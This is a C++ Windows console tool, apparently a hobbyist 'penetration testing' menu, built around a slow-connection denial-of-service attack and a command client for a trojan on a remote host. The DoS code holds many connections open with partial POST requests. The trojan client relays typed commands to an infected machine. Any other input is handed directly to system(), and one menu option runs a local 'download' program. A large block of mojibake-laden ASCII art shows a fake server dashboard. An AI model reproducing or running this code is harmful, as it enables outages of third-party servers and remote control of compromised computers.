#include <winsock2.h>
#include <iostream>
#include <ws2tcpip.h>
#include <thread>
#include <vector>
#include <string>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

std::vector<SOCKET> socks;
SOCKET sock;

void SetConsoleColor0(int color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}


std::string sendCommandAndReceive(const char* serverIp, int serverPort, const std::string& command) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData)!= 0) {
        return "WSAStartup failed.";
    }
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        return "Error creating socket.";
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort);
    serverAddr.sin_addr.s_addr = inet_addr(serverIp);

    if (connect(sock, reinterpret_cast<SOCKADDR*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return "Connection failed.";
    }

    send(sock, command.c_str(), command.length(), 0);
    char buffer[1024];
    int bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (bytesRead <= 0) {
        closesocket(sock);
        WSACleanup();
        return "Error receiving data.";
    }
    buffer[bytesRead] = '\0';
    std::string result(buffer);

    closesocket(sock);
    WSACleanup();
    return result;
}


void trojan_horse() {
    std::cout << R"( _____          _               _   _                     )" << std::endl;
    std::cout << R"(|_   _| __ ___ (_) __ _ _ __   | | | | ___  _ __ ___  ___ )" << std::endl;
    std::cout << R"(  | || '__/ _ \| |/ _` | '_ \  | |_| |/ _ \| '__/ __|/ _ \)" << std::endl;
    std::cout << R"(  | || | | (_) | | (_| | | | | |  _  | (_) | |  \__ \  __/)" << std::endl;
    std::cout << R"(  |_||_|  \___// |\__,_|_| |_| |_| |_|\___/|_|  |___/\___|)" << std::endl;
    std::cout << R"(              |__/ )" << std::endl;

    std::string serverIp;
    std::cout << "The ip of trojan horse: ";
    std::cin >> serverIp;

    int serverPort;
    std::cout << "The port of virus: ";
    std::cin >> serverPort;

    while (true) {
        std::string command;
        std::cout << "Enter the command(enter 'exit' to exit): ";
        std::cin >> command;
        if (command == "exit") {
            return;
        }
        std::string result = sendCommandAndReceive(serverIp.c_str(), serverPort, command);
        std::cout << "Return: " << result << std::endl;
    }

    return;
}
void conn_thread(int max_conn, int port, const std::string& host, const std::string& page) {
    for (int i = 0; i < max_conn; ++i) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(port);

        addrinfo hints = {};
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        addrinfo* result;
        if (getaddrinfo(host.c_str(), nullptr, &hints, &result) == 0) {
            serverAddr.sin_addr = reinterpret_cast<sockaddr_in*>(result->ai_addr)->sin_addr;
            freeaddrinfo(result);

            if (connect(s, reinterpret_cast<SOCKADDR*>(&serverAddr), sizeof(serverAddr)) == 0) {
                std::string request = "POST " + page + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 10000000\r\nCookie: dklkt_dos_test\r\n\r\n";
                send(s, request.c_str(), request.length(), 0);
                std::cout << "[OK] Send buf OK!,conn=" << i << std::endl;
                socks.push_back(s);
            } else {
                std::cerr << "[NO] Can not connect or send error" << std::endl;
                Sleep(1000);
            }
        } else {
            std::cerr << "[NO] Ip error" << std::endl;
            Sleep(1000);
        }
    }
}

void send_thread() {
    while (true) {
        for (auto it = socks.begin(); it!= socks.end();) {
            SOCKET s = *it;
            if (send(s, "f", 1, 0) == SOCKET_ERROR) {
                std::cerr << "[NO] Send error" << std::endl;
                closesocket(s);
                it = socks.erase(it);
            } else {
                ++it;
            }
        }
        Sleep(1000);
    }
}

void dos() {
    int max_conn;
    int port;
    std::string host;
    std::string page;

    std::cout << "Enter the maximum number of connections:";
    std::cin >> max_conn;
    std::cout << "Enter the port number:";
    std::cin >> port;
    std::cout << "Enter the host name:";
    std::cin >> host;
    std::cout << "Enter the page path:";
    std::cin >> page;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData)!= 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return;
    }

    std::thread connTh1(conn_thread, max_conn, port, host, page);
    std::thread sendTh1(send_thread);
    std::thread connTh2(conn_thread, max_conn, port, host, page);
    std::thread sendTh2(send_thread);

    connTh1.join();
    sendTh1.join();
    connTh2.join();
    sendTh2.join();

    WSACleanup();
    return;
}

void hk_main() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	system("cls");
    SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE);
	std::string originalString = R"(©°©¤Total Transactions©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´©°©¤Errors Rate©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´©°©¤LCD Test©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´
©¦     ?                                                                                  ©¦©¦     ?                                     ©¦©¦                                           ©¦
©¦     ?                                                                       ©°©¤©¤©¤©¤©¤©¤©¤©¤©´ ©¦©¦  48 ?                     ©°©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´ ©¦©¦  ??????????????? ??????                   ©¦
©¦     ?                                                                       ©¦USA     ©¦ ©¦©¦     ?                     ©¦server 1     ©¦ ©¦©¦  ??????????????? ??????                   ©¦
©¦  80 ?                                                                       ©¦Europe  ©¦ ©¦©¦  36 ?                     ©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼ ©¦©¦  ??????  ??????  ??????                   ©¦
©¦     ?????   ?                                         ????????  ????????????©¸©¤©¤©¤©¤©¤©¤©¤©¤©¼ ©¦©¦     ?    ???                              ©¦©¦                                           ©¦
©¦     ?    ??? ??????                               ?????      ???                       ©¦©¦  24 ??????  ?????????                     ©¦©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼
©¦  60 ?              ????????                   ????                                     ©¦©¦     ?                ?????????????        ©¦©°©¤Deployment Progress©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´
©¦     ?                     ??????        ???????               ??                       ©¦©¦  12 ?                                     ©¦©¦                                           ©¦
©¦     ?                           ?????????              ???????????????????????????     ©¦©¦     ?                                     ©¦©¦                                           ©¦
©¦     ?                                ????  ?????????????            ?                  ©¦©¦  0  ?                                     ©¦©¦                                           ©¦
©¦  40 ?                         ???????    ??                                            ©¦©¦     ??????????????????????????????????    ©¦©¦       41%                                 ©¦
©¦     ???????????????    ???????                                                         ©¦©¦      00:00      00:10      00:20          ©¦©¦                                           ©¦
©¦     ?              ?????                                                               ©¦©¦                                           ©¦©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼
©¦     ?                                                                                  ©¦©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼
©¦  20 ?                                                                                  ©¦©°©¤Server Utilization (%)©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´©°©¤Active Processes©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´
©¦     ?                                                                                  ©¦©¦                                           ©¦©¦Process                 Cpu (%)   Memory   ©¦
©¦     ?                                                                                  ©¦©¦                                           ©¦©¦                                           ©¦
©¦  0  ?                                                                                  ©¦©¦                                           ©¦©¦ tar -xvf                4         22      ©¦
©¦     ???????????????????????????????????????????????????????????????????????????????    ©¦©¦                                           ©¦©¦ npm install             0         35      ©¦
©¦      00:00        00:30        01:20        02:10        03:00        03:50            ©¦©¦                                           ©¦©¦ timer                   5         51      ©¦
©¦                                                                                        ©¦©¦                                           ©¦©¦ node                    3         39      ©¦
©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼©¦                                           ©¦©¦ watchdog                3         88      ©¦
©°©¤Servers Location©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´©¦                                           ©¦©¦ node                    3         16      ©¦
©¦                                                                                        ©¦©¦                                           ©¦©¦ timer                   4         80      ©¦
©¦                                 ??                                                     ©¦©¦                                           ©¦©¦ ~/ls -l                 0         19      ©¦
©¦               ??????????????????  ?????    ?????  ??????    ??????     ???             ©¦©¦                                           ©¦©¦ watchdog                1         9       ©¦
©¦  ?????????????????????????????  ?????? ?    ????????????????    ?????????????????      ©¦©¦   6      6      1      1      6      4    ©¦©¦ tar -xvf                4         86      ©¦
©¦  ?? ???????????????????????? ????  ??? ?? ?? ??????                    ??????????      ©¦©¦   US1    US2    EU1    AU1    AS1    JP1  ©¦©¦ java                    2         97      ©¦
©¦   ????     ????   ????????????        ????????                         ??  ?? ??       ©¦©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼
©¦              ?  ?   ??????????         ??????????? ?? ?  ??        ? ????              ©¦©°©¤Server Log©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´©°©¤Percent Donut©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´©°©¤Storage©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´
©¦              ???       ??             ???????????  ??             ??????               ©¦©¦starting process watchdog   ©¦©¦                            ©¦©¦                            ©¦
©¦                ??? ??????            ??     ??  ?? ??????         ??                   ©¦©¦terminating server US2      ©¦©¦           ?????            ©¦©¦                            ©¦
©¦       ?          ??????????          ?           ?????  ? ????? ?? ??                  ©¦©¦terminating server US1      ©¦©¦        ????????????        ©¦©¦                            ©¦
©¦                      ?????????       ?????        ???    ??  ???? ???                  ©¦©¦terminating server EU1      ©¦©¦       ????     ?????       ©¦©¦     41%         59%        ©¦
©¦                     ?  ?     ???          ??    ? ?           ?????  ???               ©¦©¦starting process npm install©¦©¦      ???         ????      ©¦©¦                            ©¦
©¦                        ??       ??         ??    ? ?            ???  ??????            ©¦©¦terminating server EU1      ©¦©¦      ??     56%   ???      ©¦©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼
©¦    ?                    ??      ?          ??   ????              ???? ???   ?  ?      ©¦©¦avg. wait time 0.60         ©¦©¦      ???          ???      ©¦
©¦                          ?   ????           ?  ?? ??              ?      ??            ©¦©¦avg. wait time 0.10         ©¦©¦      ?????      ????       ©¦©°©¤Throughput (bits/sec)©¤©¤©¤©¤©¤©¤©´
©¦                         ?? ???              ????                  ?????????   ??       ©¦©¦terminating server AU1      ©¦©¦       ?????????????        ©¦©¦                            ©¦
©¦                         ? ??                                            ??   ???       ©¦©¦terminating server JP1      ©¦©¦          ????????          ©¦©¦Server1:                    ©¦
©¦                         ?????                                                          ©¦©¦terminating server AS1      ©¦©¦           storage          ©¦©¦¨€¨x¨y¨€¨y¨x¨€¨{¨}¨€¨{¨}¨x¨x¨€¨}¨x¨€¨€¨y¨y¨x¨{¨€¨y¨}¨x¨y©¦
©¦                                                                                        ©¦©¦starting process java       ©¦©¦                            ©¦©¦                            ©¦
©¦                                                                                        ©¦©¦starting process gulp       ©¦©¦                            ©¦©¦Server2:                    ©¦
©¦                                                                                        ©¦©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼
©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼
)";
    for (size_t i = 0; i < originalString.size(); ++i) {
        if (originalString[i] == '?') {
            originalString[i] = '.';
        }
    }

    std::cout << originalString << std::endl;
    
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    std::cout << "\nTools Loading ";
    Sleep(200);
    std::cout << ".";
    Sleep(200);
    std::cout << ".";
    Sleep(200);
    std::cout << ".";
    Sleep(200);
    std::cout << ".";
    Sleep(200);
    std::cout << ".";
    Sleep(200);
    std::cout << ".";
    std::cout << "\n\nPenetration Testing\nwriter:linhonghan\n";
    SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
	std::string cmd;
    start:
	while(true) {
		std::cout << ">";
		std::cin >> cmd;
		if(cmd == "exit") {
			return;
		}
        if(static_cast<int>(cmd[0]) == 0x0D) {
            goto start;
        }
		if(cmd == "Attack") {
        	WSACleanup();
			dos();
        } else if(cmd == "Virus") {
            trojan_horse();
        } else if(cmd == "make") {
    		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        	std::cout << "\nCreating the project:\n    Enter kernel.\nmake\nMakefile:Download the tools first.\nbuild\n";
    		Sleep(500);
        	std::cout << "init\n\n";
            system(".\\download");
        } else{
    		SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
    		system(cmd.c_str());
    		SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
        }
	}
    return;
}

